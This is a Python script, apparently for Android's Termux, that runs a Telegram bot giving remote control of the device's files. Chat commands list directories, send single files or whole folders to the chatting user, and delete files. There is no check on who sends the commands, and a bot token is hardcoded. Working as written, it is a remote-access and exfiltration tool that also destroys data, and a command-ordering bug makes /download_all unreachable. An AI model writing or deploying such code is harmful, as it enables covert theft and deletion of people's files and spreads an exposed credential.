import telepot
import os

TOKEN = '7007807203:AAF5c0mAi-BCiZpm3EjoxoiVwfj2b4QOtUI'
termux_dir = "/data/data/com.termux/files/home"

def list_files(directory):
    files = os.listdir(directory)
    if files:
        return "\n".join(files)
    else:
        return "Nenhum arquivo encontrado."

def download_file(file_path, chat_id):
    if os.path.isfile(file_path):
        bot.sendDocument(chat_id, open(file_path, 'rb'))
    else:
        bot.sendMessage(chat_id, "Arquivo não encontrado.")

def download_all_files(directory, chat_id):
    if os.path.isdir(directory):
        files = os.listdir(directory)
        for file in files:
            file_path = os.path.join(directory, file)
            bot.sendDocument(chat_id, open(file_path, 'rb'))
    else:
        bot.sendMessage(chat_id, "Diretório não encontrado.")

def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    
    if 'text' in msg:
        command = msg['text']
        
        if command.startswith("/show_image"):
            image_path = command.split(" ")[1]
            if os.path.isfile(image_path) and image_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                bot.sendPhoto(chat_id, open(image_path, 'rb'))
            else:
                bot.sendMessage(chat_id, "Arquivo de imagem não encontrado ou formato não suportado.")
        elif command.startswith("/cd "):
            try:
                directory = command.split(" ")[1]
                os.chdir(directory)
                bot.sendMessage(chat_id, f"Diretório de trabalho alterado para {directory}")
            except FileNotFoundError:
                bot.sendMessage(chat_id, "Diretório não encontrado.")
        elif command.startswith("/ls"):
            if len(command.split(" ")) > 1:
                directory = command.split(" ")[1]
                files_list = list_files(directory)
            else:
                files_list = list_files(os.getcwd())
            bot.sendMessage(chat_id, files_list)
        elif command.startswith("/download"):
            file_path = command.split(" ", 1)[1]
            download_file(file_path, chat_id)
        elif command.startswith("/download_all"):
            directory = command.split(" ", 1)[1]
            download_all_files(directory, chat_id)
        elif command.startswith("/rm "):
            file_path = command.split(" ", 1)[1]
            try:
                os.remove(file_path)
                bot.sendMessage(chat_id, f"Arquivo {file_path} removido com sucesso.")
            except Exception as e:
                bot.sendMessage(chat_id, f"Erro ao remover o arquivo: {str(e)}")
        elif command.startswith("/help"):
            help_message = """
            Lista de comandos disponíveis:
            /ls <diretório> - Lista os arquivos em um diretório.
            /download <caminho_do_arquivo> - Baixa um arquivo.
            /download_all <diretório> - Baixa todos os arquivos de um diretório.
            /show_image <caminho_da_imagem> - Exibe uma imagem.
            /cd <diretório> - Muda o diretório de trabalho.
            /rm <caminho_do_arquivo> - Remove um arquivo.
            /help - Exibe esta mensagem de ajuda.
            """
            bot.sendMessage(chat_id, help_message)

bot = telepot.Bot(TOKEN)
bot.message_loop(handle)

while True:
    pass
